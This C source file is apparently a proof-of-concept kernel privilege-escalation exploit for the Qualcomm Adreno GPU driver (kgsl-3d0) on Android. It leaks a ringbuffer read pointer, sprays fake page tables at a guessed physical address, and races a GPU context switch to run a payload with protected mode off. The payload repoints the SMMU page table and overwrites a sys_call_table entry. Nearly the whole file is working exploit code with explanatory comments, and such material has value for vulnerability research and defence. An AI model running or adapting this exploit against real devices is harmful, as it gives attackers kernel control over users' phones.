

#include <stdio.h> 
#include <stdlib.h> 
#include <string.h>
#include <stdint.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <time.h>
#include <poll.h>
#include <ctype.h> 
#include <err.h>
#include <sys/syscall.h>
#include <signal.h>

#include "adrenaline.h"

#define PAGE_SIZE 0x1000

#define NPBUFS 64

#define LEVEL1_SHIFT    30
#define LEVEL1_MASK     (0x1ff << LEVEL1_SHIFT)

#define LEVEL2_SHIFT    21
#define LEVEL2_MASK     (0x1ff << LEVEL2_SHIFT)

#define LEVEL3_SHIFT    12
#define LEVEL3_MASK     (0x1ff << LEVEL3_SHIFT)

#define ENTRY_VALID     3
#define ENTRY_RW        (1 << 6)

/* Normal Non-Cacheable memory */
#define ENTRY_MEMTYPE_NNC   (3 << 2)

/* "outer attributes are exported from the processor to the external memory bus
 * and are therefore potentially used by cache hardware external to the core or
 * cluster" */
#define ENTRY_OUTER_SHARE (2 << 8)

/* Active */
#define ENTRY_AF (1<<10)

/* Non-Global */
#define ENTRY_NG (1<<11)

char retbuf[256];

// func from 2019-2215 poc p0
// example usage
//  static char page_buffer[0x1000];
//hexdump_memory((unsigned char *)page_buffer, sizeof(page_buffer));

void hexdump_memory(unsigned char *buf, size_t byte_count) {
  unsigned long byte_offset_start = 0;
  if (byte_count % 16)
    // errx(1, "hexdump_memory called with non-full line");
  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
          byte_offset += 16) {
    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%08lx  ", byte_offset);
    for (int i=0; i<16; i++) {
      linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      char c = buf[byte_offset + i];
      if (isalnum(c) || ispunct(c) || c == ' ') {
        *(linep++) = c;
      } else {
        *(linep++) = '.';
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }
}

int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa) {
    uint64_t *level_base;
    uint64_t level1_index, level2_index, level3_index;
    int i;

    for (i = 0; i < pages; i++) {
        level_base = (uint64_t *) (tt0 + (i * PAGE_SIZE));

        memset(level_base, 0x45, 4096);

        level1_index = (fake_gpuaddr & LEVEL1_MASK) >> LEVEL1_SHIFT;
        level2_index = (fake_gpuaddr & LEVEL2_MASK) >> LEVEL2_SHIFT;
        level3_index = (fake_gpuaddr & LEVEL3_MASK) >> LEVEL3_SHIFT;

        if (level1_index == level2_index || level1_index == level3_index ||
            level2_index == level3_index) {
            return -1;
        }

        level_base[level1_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level2_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level3_index] = (uint64_t) (target_pa | ENTRY_VALID | ENTRY_RW |
                                               ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                               ENTRY_NG);
    }

    return 0;
}

/* modified version of kilroy's kgsl_ctx_create. create a KGSL context that will use
 * ringbuffer 0, and make sure KGSL_CONTEXT_USER_GENERATED_TS is disabled */
int kgsl_ctx_create0(int fd, uint32_t *ctx_id) {
    struct kgsl_drawctxt_create req = {
            .flags = 0x00001812, // low prio, rb 0
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
    if (ret)
        return ret;

    *ctx_id = req.drawctxt_id;

    return 0;
}

/* cleanup an existing GPU context */
int kgsl_ctx_destroy(int fd, uint32_t ctx_id) {
    struct kgsl_drawctxt_destroy req = {
            .drawctxt_id = ctx_id,
    };

    return ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &req);
}

/* modified version of kilroy's kgsl_map. the choice to use KGSL_MEMFLAGS_USE_CPU_MAP
 * comes from earlier debugging efforts, but a normal user mapping should work as well,
 * it would just need to use uint64_t and drop the flags. */
int kgsl_map(int fd, unsigned long addr, size_t len, uint32_t *gpuaddr) {
    struct kgsl_map_user_mem req = {
            .len = len,
            .offset = 0,
            .hostptr = addr,
            .memtype = KGSL_USER_MEM_TYPE_ADDR,
            .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    if (ret)
        return ret;

    *gpuaddr = req.gpuaddr;

    return 0;
}

/* similar to kgsl_gpu_command_n, but specifically starts with a wait command IB before the
 * variable length repeated IB */
int kgsl_gpu_command_align(int fd, uint32_t ctx_id, uint32_t wait_gpuaddr,
        uint32_t wait_cmdsize, uint32_t nop_gpuaddr, uint32_t nop_cmdsize, uint32_t n) {
    struct kgsl_command_object *cmds;

    struct kgsl_gpu_command req = {
            .context_id = ctx_id,
            .cmdsize = sizeof(struct kgsl_command_object),
            .numcmds = n,
    };
    size_t cmds_size;
    uint32_t i;

    cmds_size = n * sizeof(struct kgsl_command_object);

    cmds = (struct kgsl_command_object *) malloc(cmds_size);

    if (cmds == NULL) {
        return -1;
    }

    memset(cmds, 0, cmds_size);

    cmds[0].flags = KGSL_CMDLIST_IB;
    cmds[0].gpuaddr = wait_gpuaddr;
    cmds[0].size = wait_cmdsize;

    for (i = 1; i < n; i++) {
        cmds[i].flags = KGSL_CMDLIST_IB;
        cmds[i].gpuaddr = nop_gpuaddr;
        cmds[i].size = nop_cmdsize;
    }

    req.cmdlist = (unsigned long) cmds;

    return ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);
}

/* send a variable number of repeated IBs to the GPU. */
int kgsl_gpu_command_n(int fd, uint32_t ctx_id, uint32_t gpuaddr, uint32_t cmdsize, uint32_t n) {
    struct kgsl_command_object *cmds;

    struct kgsl_gpu_command req = {
            .cmdsize = sizeof(struct kgsl_command_object),
            .numcmds = n,
            .context_id = ctx_id,
    };
    size_t cmds_size;
    uint32_t i;

    cmds_size = n * sizeof(struct kgsl_command_object);

    cmds = (struct kgsl_command_object *) malloc(cmds_size);

    if (cmds == NULL) {
        return -1;
    }

    memset(cmds, 0, cmds_size);

    for (i = 0; i < n; i++) {
        cmds[i].flags = KGSL_CMDLIST_IB;
        cmds[i].gpuaddr = gpuaddr;
        cmds[i].size = cmdsize;
    }

    req.cmdlist = (unsigned long) cmds;

    return ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);
}

/* send pad IBs and a payload IB at a specific index to the GPU. the index is chosen to win
 * the race condition with the targeted context switch */
int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint32_t gpuaddr, uint32_t cmdsize, uint32_t n, uint32_t target_idx, uint64_t target_cmd, uint32_t target_size) {
    struct kgsl_command_object *cmds;

    struct kgsl_gpu_command req = {
            .context_id = ctx_id,
            .cmdsize = sizeof(struct kgsl_command_object),
            .numcmds = n,
    };
    size_t cmds_size;
    uint32_t i;

    cmds_size = n * sizeof(struct kgsl_command_object);

    cmds = (struct kgsl_command_object *) malloc(cmds_size);

    if (cmds == NULL) {
        return -1;
    }

    memset(cmds, 0, cmds_size);

    for (i = 0; i < n; i++) {
        cmds[i].flags = KGSL_CMDLIST_IB;

        if (i == target_idx) {
            cmds[i].gpuaddr = target_cmd;
            cmds[i].size = target_size;
        }
        else {
            /* the shift here is helpful for debugging failed alignment */
            cmds[i].gpuaddr = gpuaddr + (i << 16);
            cmds[i].size = cmdsize;
        }
    }

    req.cmdlist = (unsigned long) cmds;

    return ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);
}

void adrenaline_child(int read_pipe, int write_pipe) {
    int fd, ret;
    uint32_t map_addr = 0x4000a000;
    uint32_t *cs_buf, *cs_cmds;
    uint32_t cs_cmds_size;
    uint32_t cs_gpuaddr;
    uint32_t ctx_id;
    uint32_t sync;
    struct pollfd pfd;

    printf("[*] child: starting adrenaline_child\n");

    fd = open("/dev/kgsl-3d0", O_RDWR);

    if (fd == -1) {
        return;
    }

    cs_buf = (uint32_t *) mmap((void *) map_addr, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED|MAP_LOCKED, -1, 0);

    if (cs_buf == MAP_FAILED) {
        return;
    }

    ret = kgsl_map(fd, (unsigned long) cs_buf, 4096, &cs_gpuaddr);

    if (ret == -1) {
        return;
    }

    ret = kgsl_ctx_create0(fd, &ctx_id);

    if (ret) {
        return;
    }

    cs_cmds = cs_buf;
    /* if executed this will show up as a invalid opcode GPU fault in dmesg, which is the
     * indication that we lost the race condition. if the parent wins the race condition, this
     * will never be executed */
    /* CP switches the pagetable (context switch)*/
	// *cs_cmds++ = cp_type4_packet(CP_SMMU_TABLE_UPDATE, 3);
    // cs_cmds+= cp_gpuaddr(cs_cmds, cs_gpuaddr);
    *cs_cmds++ = 0x21212121;
    *cs_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 3);
    cs_cmds+= cp_gpuaddr(cs_cmds, cs_gpuaddr);
    cs_cmds_size = (cs_cmds - cs_buf) * 4;

    pfd.fd = read_pipe;
    pfd.events = POLLIN;
    pfd.revents = 0;

    if (poll(&pfd, 1, -1) == -1) {
        exit(-1);
    }

    printf("[*] child: recieve 6 from pipe buff, and kick off a GPU context switch\n");

    read(read_pipe, &sync, sizeof(uint32_t));

    if (sync != 0x66666666) {
        return;
    }
    
    printf("[*] child: run GPU context switch\n");
    ret = kgsl_gpu_command_n(fd, ctx_id, cs_gpuaddr, cs_cmds_size, 1);

    if (ret == -1) {
        return;
    }

    printf("[*] child: let the parent process know that the context switch has been dispatched\n");

    /* let the parent process know that the context switch has been dispatched */
    sync = 0x77777777;
    write(write_pipe, &sync, sizeof(uint32_t));

    usleep(200000);

    ret = kgsl_ctx_destroy(fd, ctx_id);

    if (ret == -1) {
        return;
    }

    ret = munmap(cs_buf, 4096);

    if (ret == -1) {
        return;
    }

    close(fd);

    return;
}

char *adrenaline_parent(int read_pipe, int write_pipe, uint32_t rptr_base) {
    int fd, ret, i;
    struct pollfd pfd;
    uint32_t map_addr = 0x40000000;
    uint32_t *wait_cmds, wait_cmds_size;
    uint32_t *wait_cmd_buf, wait_cmd_gpuaddr;
    uint32_t *data_buf, data_gpuaddr;
    uint32_t *nop_cmds, nop_cmds_size;
    uint32_t *nop_buf, nop_cmd_gpuaddr;
    uint32_t *payload_cmds, payload_cmds_size;
    uint32_t *payload_buf, payload_cmd_gpuaddr;
    uint32_t ctx_id, sync;
    uint32_t pbuf_len;
    uint8_t *pbufs[NPBUFS], *pbuf;
    uint64_t phyaddr;

    int j;

    printf("[*] parent: starting adrenaline_parent\n");

    fd = open("/dev/kgsl-3d0", O_RDWR);

    if (fd == -1) {
        return "error opening kgsl-3d0";
    }

    wait_cmd_buf = (uint32_t *) mmap((void *) map_addr, PAGE_SIZE,
                                        PROT_READ|PROT_WRITE,
                                        MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    if (wait_cmd_buf == MAP_FAILED) {
        return "mmap failed (wait_cmd_buf)";
    }

    ret = kgsl_map(fd, (unsigned long) wait_cmd_buf, PAGE_SIZE, &wait_cmd_gpuaddr);

    if (ret == -1) {
        return "kgsl_map failed (wait_cmd_buf)";
    }

    map_addr += PAGE_SIZE;

    data_buf = (uint32_t *) mmap((void *) map_addr, PAGE_SIZE,
                                        PROT_READ|PROT_WRITE,
                                        MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    if (data_buf == MAP_FAILED) {
        return "mmap failed (data_buf)";
    }

    ret = kgsl_map(fd, (unsigned long) data_buf, PAGE_SIZE, &data_gpuaddr);

    if (ret == -1) {
        return "kgsl_map failed (data_buf)";
    }

    map_addr += PAGE_SIZE;

    nop_buf = (uint32_t *) mmap((void *) map_addr, PAGE_SIZE,
                                        PROT_READ|PROT_WRITE,
                                        MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    if (nop_buf == MAP_FAILED) {
        return "mmap failed (nop_buf)";
    }

    ret = kgsl_map(fd, (unsigned long) nop_buf, PAGE_SIZE, &nop_cmd_gpuaddr);

    if (ret == -1) {
        return "kgsl_map failed (nop_buf)";
    }

    map_addr += PAGE_SIZE;

    payload_buf = (uint32_t *) mmap((void *) map_addr, PAGE_SIZE,
                                        PROT_READ|PROT_WRITE,
                                        MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED|MAP_LOCKED, -1, 0);

    if (payload_buf == MAP_FAILED) {
        return "mmap failed (payload_buf)";
    }

    ret = kgsl_map(fd, (unsigned long) payload_buf, PAGE_SIZE, &payload_cmd_gpuaddr);

    if (ret == -1) {
        return "kgsl_map failed (payload_buf)";
    }

    /* we use ringbuffer 0 because it seems to be unused, so we don't have any contention
     * and the offsets are stable */
    ret = kgsl_ctx_create0(fd, &ctx_id);

    if (ret) {
        snprintf(retbuf, 255, "kgsl_ctx_create0 failed");
        return retbuf;
    }

    /* this is the physical address of the fake page table that we will point the SMMU TTBR0 to.
     *
     * it's chosen more or less at random based on results of performing a similar spray and then
     * checking commonly recurring entries in /proc/self/pagemap
     */
    phyaddr = 0xfebeb000;

    /* spray 16mb per mapping */
    pbuf_len = PAGE_SIZE * 4096;

    /* this loop is spraying a fake page table so that it hopefully lands at a fixed physical
     * address. one way that the exploit can fail is if this page has already been allocated,
     * in which case a reboot might be necessary */
    for (i = 0; i < NPBUFS; i++) {
        pbuf = (uint8_t *) mmap(NULL, pbuf_len, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

        if (pbuf == (uint8_t *) MAP_FAILED) {
            snprintf(retbuf, 255, "pbuf mmap failed (%d)", i);
            return retbuf;
        }

        /* our fake gpuaddress (0x40403000) is chosen to allow level1/2/3 to be at different
         * offsets within the same page (e.g. level 1 = 0x1, level2 = 0x3, level3 = 0x3).
         *
         * the target physical page (0x821D9000) corresponds to sys_call_table, which is at
         * a fixed physical address that you can calculate by taking the base of "Kernel Code"
         * from /proc/iomem and then adding (sys_call_table - _text) from /proc/kallsyms */
        ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, 0x40403000, 0x821a5000);

        if (ret == -1) {
            snprintf(retbuf, 255, "setup_pagetables failed");
            return retbuf;
        }

        pbufs[i] = pbuf;
    }

    /* setting up out wait commands. first stage (0x41414141) waits for the ringbuffer to be
     * layed out correctly, then the scratch buffer rptr is corrupted, and finally the second
     * stage (0x42424242) waits for the ringbuffer corruption to start.
     *
     * the return from this IB will be followed by a context switch, which will be corrupted
     * mid-execution (e.g. while protected mode is disabled). */
    wait_cmds = wait_cmd_buf;
    
    /* stage 1 wait */
    *wait_cmds++ = cp_type7_packet(CP_WAIT_REG_MEM, 6);
    *wait_cmds++ = 0x13;
    wait_cmds += cp_gpuaddr(wait_cmds, data_gpuaddr);
    *wait_cmds++ = 0x41414141;
    *wait_cmds++ = 0xffffffff;
    *wait_cmds++ = 0x1;

    /* corrupt scratch rptr for ringbuffer 0 */
    *wait_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    wait_cmds += cp_gpuaddr(wait_cmds, rptr_base);
    *wait_cmds++ = 0x1ffc;

    /* ensure that the write has taken effect */
    *wait_cmds++ = cp_type7_packet(CP_WAIT_REG_MEM, 6);
    *wait_cmds++ = 0x13;
    wait_cmds += cp_gpuaddr(wait_cmds, rptr_base);
    *wait_cmds++ = 0x1ffc;
    *wait_cmds++ = 0xffffffff;
    *wait_cmds++ = 0x1;

    /* stage 2 wait */
    *wait_cmds++ = cp_type7_packet(CP_WAIT_REG_MEM, 6);
    *wait_cmds++ = 0x13;
    wait_cmds += cp_gpuaddr(wait_cmds, data_gpuaddr+4);
    *wait_cmds++ = 0x42424242;
    *wait_cmds++ = 0xffffffff;
    *wait_cmds++ = 0x1;

    wait_cmds_size = (wait_cmds - wait_cmd_buf) * 4;

    /* multi-purpose NOP buffer, mostly used for getting the layout of the ringbuffer correct */
    nop_cmds = nop_buf;
    *nop_cmds++ = cp_type7_packet(CP_NOP, 1);
    *nop_cmds++ = cp_type7_packet(CP_NOP, 0);
    nop_cmds_size = (nop_cmds - nop_buf) * 4;

    /* payload IB. this runs with protected mode disabled (and apriv enabled) */
    payload_cmds = payload_buf;

    *payload_cmds++ = cp_type7_packet(CP_NOP, 1);
    *payload_cmds++ = 0xffffffff;

    /* borrowed from driver code for "stabler synchroinzation" */
    payload_cmds += _adreno_iommu_add_idle_indirect_cmds(payload_cmds);
    payload_cmds += cp_wait_for_idle(payload_cmds);
    payload_cmds += cp_wait_for_me(payload_cmds);

    /* write fake page table to TTBR0 register */
    *payload_cmds++ = cp_register(0x12008, 2);
    *payload_cmds++ = phyaddr;
    *payload_cmds++ = 0x00400000;

    /* following the driver's actions after page table changes */
    payload_cmds += cp_wait_for_me(payload_cmds);
    payload_cmds += cp_wait_for_idle(payload_cmds);
    payload_cmds += cp_invalidate_state(payload_cmds);

    /* overwrite fork()'s syscall table entry for some hasty fireworks */
    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    payload_cmds += cp_gpuaddr(payload_cmds, 0x40403000+16);
    *payload_cmds++ = 0x13371337;
    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    payload_cmds += cp_gpuaddr(payload_cmds, 0x40403000+20);
    *payload_cmds++ = 0x13371337;

    payload_cmds_size = (payload_cmds - payload_buf) * 4;

    usleep(50000);

    /* first we pad the ringbuffer to get our wait IB roughly in the middle */
    ret = kgsl_gpu_command_n(fd, ctx_id, nop_cmd_gpuaddr, nop_cmds_size, 868);

    if (ret == -1) {
        snprintf(retbuf, 255, "nop_cmd kgsl_gpu_command failed errno %d", errno);
        return retbuf;
    }

    printf("[*] parent: kick off the wait command, and follow it with the correct amount of alignment nops\n");

    /* kick off the wait command, and follow it with the correct amount of alignment nops.
     * the purpose of the alignment nops is to get the child's context switch in the right place
     * for the race condition one guess would be that this is to get aligned to a boundary based
     * on cache line width or an internal prefetch buffer size, since it seems to be stable */
    ret = kgsl_gpu_command_align(fd, ctx_id, wait_cmd_gpuaddr, wait_cmds_size, nop_cmd_gpuaddr, nop_cmds_size, 36);

    if (ret == -1) {
        snprintf(retbuf, 255, "wait_cmd kgsl_gpu_command failed errno %d", errno);
        return retbuf;
    }

    printf("[*] parent: send a message to our child process, which will kick off a GPU context switch\n");

    /* send a message to our child process, which will kick off a GPU context switch */
    sync = 0x66666666;
    write(write_pipe, &sync, sizeof(uint32_t));

    pfd.fd = read_pipe;
    pfd.events = POLLIN;
    pfd.revents = 0;
    
    printf("[*] parent: wait for confirmation that the context switch is in before proceeding \n");

    /* wait for confirmation that the context switch is in before proceeding */
    if (poll(&pfd, 1, 4) <= 0) {
        snprintf(retbuf, 255, "poll error or timeout");
        return retbuf;
    }

    read(read_pipe, &sync, sizeof(uint32_t));

    if (sync != 0x77777777) {
        snprintf(retbuf, 255, "unexpected sync result %x", sync);
        return retbuf;
    }

    printf("[*] parent: fill up the rest of ringbuffer 0 \n");

    /* fill up the rest of ringbuffer 0 so that subsequent GPU commands will start at the
     * beginning of the ringbuffer. */
    ret = kgsl_gpu_command_n(fd, ctx_id, nop_cmd_gpuaddr, nop_cmds_size, 888);

    if (ret == -1) {
        snprintf(retbuf, 255, "nop_cmd kgsl_gpu_command failed errno %d", errno);
        return retbuf;
    }

    usleep(20000);

    /* the next two GPU commands are inert, but are used to get correct alignment for the
     * race condition. without this we likely end up in the middle of an IB command, which
     * would result in a fault */
    ret = kgsl_gpu_command_n(fd, ctx_id, nop_cmd_gpuaddr, nop_cmds_size, 100);

    if (ret == -1) {
        snprintf(retbuf, 255, "nop_cmd kgsl_gpu_command failed errno %d", errno);
        return retbuf;
    }

    ret = kgsl_gpu_command_n(fd, ctx_id, nop_cmd_gpuaddr, nop_cmds_size, 1);

    if (ret == -1) {
        snprintf(retbuf, 255, "nop_cmd kgsl_gpu_command failed errno %d", errno);
        return retbuf;
    }

    printf("[*] parent: signal the wait command to progress to scratch buffer rptr corruption \n");

    /* at this point the ringbuffer layout is complete, and we can signal the wait command
     * to progress to scratch buffer rptr corruption */
    *data_buf = 0x41414141;
    __builtin___clear_cache((char *) data_buf, (char *) data_buf+4096);

    // hexdump scratch buffer rptr corrupt
    printf("[*] parent: scratch buffer rptr corrupt with AAAA\n");
    hexdump_memory((unsigned char *)data_buf, sizeof(data_buf+4096));

    /* by the time this GPU command is dispatched, the scratch rptr will be invalid, which means
     * this will overwrite the existing ringbuffer contents (wait command, alignment NOPs,
     * and then the context switch) */
    ret = kgsl_gpu_command_payload(fd, ctx_id, nop_cmd_gpuaddr, nop_cmds_size, 0x376, 0x374, payload_cmd_gpuaddr, payload_cmds_size);

    if (ret == -1) {
        snprintf(retbuf, 255, "nop_cmd kgsl_gpu_command failed errno %d", errno);
        return retbuf;
    }

    usleep(50000);

    /* finish stage 2 of the wait command. the GPU will then execute the alignment NOPs and
     * start executing the context switch. before the context switch finishes the payload GPU
     * command will be written and executed */
    *(data_buf+1) = 0x42424242;
    __builtin___clear_cache((char *) data_buf, (char *) data_buf+4096);

     // hexdump exploit payload buffer 
    printf("[*] parent: exploit payload buffer\n");
    hexdump_memory((unsigned char *)data_buf, sizeof(data_buf+4096));

    usleep(50000);

    snprintf(retbuf, 255, "adrenaline race lost: context id: (%d), rptr_base: (%p) -- try again", ctx_id, rptr_base);
    return retbuf;
}

char* adrenaline(uint32_t rptr_base) {
    int parent_pipefd[2];
    int child_pipefd[2];
    pid_t p;
    char *retp;
    int i;

    printf("[*] adrenaline: starting adrenaline\n");

    pipe(parent_pipefd);
    pipe(child_pipefd);
    p = fork();
    
    /* the child process is used primarily to generate the ringbuffer context switch commands
     * that we will race against with the parent process. most of the work happens in the parent */
    if (p == 0) {
        adrenaline_child(child_pipefd[0], parent_pipefd[1]);
        exit(0);
    }
    else {
        retp = adrenaline_parent(parent_pipefd[0], child_pipefd[1], rptr_base);
    }

    return strdup(retp);
}

char* adrenaline_rptr_child(int read_pipe, int write_pipe) {
    int fd, ret;
    uint32_t ctx_id;
    uint32_t *cmds, cmds_size;
    uint32_t cmd_gpuaddr, data_gpuaddr;
    uint32_t *cmd_buf, *data_buf;
    uint32_t map_addr = 0x50005000;
    uint32_t rptr_base;
        
    printf("[*] rptr_child: starting adrenaline_rptr_child\n");

    fd = open("/dev/kgsl-3d0", O_RDWR);

    if (fd == -1) {
        return "Error opening kgsl-3d0";
    }

    cmd_buf = (uint32_t *) mmap((void *) map_addr, PAGE_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    if (cmd_buf == MAP_FAILED) {
        return "mmap failed (cmd_buf)";
    }

    ret = kgsl_map(fd, (unsigned long) cmd_buf, PAGE_SIZE, &cmd_gpuaddr);

    if (ret == -1) {
        return "kgsl_map failed (cmd_buf)";
    }

    map_addr += PAGE_SIZE;

    data_buf = (uint32_t *) mmap((void *) map_addr, PAGE_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    if (data_buf == MAP_FAILED) {
        return "mmap failed (wait_buf)";
    }

    ret = kgsl_map(fd, (unsigned long) data_buf, PAGE_SIZE, &data_gpuaddr);

    if (ret == -1) {
        return "kgsl_map failed (wait_buf)";
    }

    ret = kgsl_ctx_create0(fd, &ctx_id);

    if (ret) {
        return "kgsl_ctx_create0 failed";
    }

    cmds = cmd_buf;

    /* the constant value 0xfc04b318 is a GPU address that refers to the contents of
     * ringbuffer 0. this specific offset is not guaranteed to work on all kernels, as the
     * contents of the ringbuffer may change across versions. specifically we're reading out
     * the argument to the CP_MEM_WRITE in a6xx_preemption_pre_ibsubmit, which uses the
     * scratch buffer as a destination argument. */
    *cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
    *cmds++ = 0;
    cmds += cp_gpuaddr(cmds, data_gpuaddr);
    cmds += cp_gpuaddr(cmds,  0xfc04b318);

    cmds_size = (cmds - cmd_buf) * 4;

    usleep(50000);

    ret = kgsl_gpu_command_n(fd, ctx_id, cmd_gpuaddr, cmds_size, 1);

    if (ret == -1) {
        snprintf(retbuf, 255, "kgsl_gpu_command failed errno %d", errno);
        return strdup(retbuf);
    }

    usleep(50000);

    rptr_base = *(data_buf) & (~0xFFF);
    write(write_pipe, &rptr_base, sizeof(uint32_t));

    // hexdump ringbuffer to seee rptr
    printf("[*] dump ringbuffer\n");
    hexdump_memory((unsigned char *)rptr_base, sizeof(rptr_base));

    usleep(200000);

    ret = munmap(cmd_buf, 4096);

    if (ret == -1) {
        return "munmap failed (cmd_buf)";
    }

    ret = munmap(data_buf, 4096);

    if (ret == -1) {
        return "munmap failed (wait_buf)";
    }

    ret = kgsl_ctx_destroy(fd, ctx_id);

    if (ret == -1) {
        return "kgsl_ctx_destroy failed errno";
    }

    close(fd);

    snprintf(retbuf, 255, "%x", rptr_base);
    return strdup(retbuf);
}

uint32_t adrenaline_rptr(void) {
    struct pollfd pfd;
    int parent_pipefd[2];
    int child_pipefd[2];
    pid_t p;
    uint32_t rptr_base;

    pipe(parent_pipefd);
    pipe(child_pipefd);
        
    p = fork();

    if (p == 0) {
        /* perform the rptr leak in a child process in order to keep our current process
         * in a clean state in terms of GPU mappings -- not strictly necessary though.
         * returns an unused string that was previously used for debugging purposes, and
         * the base of the scratch buffer is sent over a pipe to the parent instead. */
        adrenaline_rptr_child(child_pipefd[0], parent_pipefd[1]);
        exit(0);
    }

    pfd.fd = parent_pipefd[0];
    pfd.events = POLLIN;
    pfd.revents = 0;

    if (poll(&pfd, 1, -1) <= 0) {
        return -1;
    }

    read(parent_pipefd[0], &rptr_base, sizeof(uint32_t));

    return rptr_base;
}
 
int main(int argc, char** argv) { 

    uint32_t rptr_base = -1;
    char *strtoul_ptr;
    char *adrenaline_str;

   if (argc < 2) {
        printf("Usage: %s <rptr>\n", argv[0]);
        printf("No arg will run leak_rptr\n");
        
        // perform the rptr leak
        rptr_base = adrenaline_rptr();

        if (rptr_base == -1) {
        printf("adrenaline_rptr failed");
        }

        else if (rptr_base < 0xFC000000 || rptr_base >= 0xFD400000) {
        return printf("adrenaline_rptr: %p is out of global mapping range\n", rptr_base);
        }
    }
    else if(argc > 2) {
        printf("Too many arguments supplied.\n");
    }
    else {
        // set rptr as input
        rptr_base = strtoul((argv[1]), &strtoul_ptr, 16);
        printf("[*] main: rptr is passed as %p\n", rptr_base);
    }

    printf("[*] main: rptr base is %p\n", rptr_base);
    // start race condition to context switch, 
    // write to gpu, and gain kernel code exec
    adrenaline_str = adrenaline(rptr_base);

    printf("%s\n", adrenaline_str);

    return 0; 
}
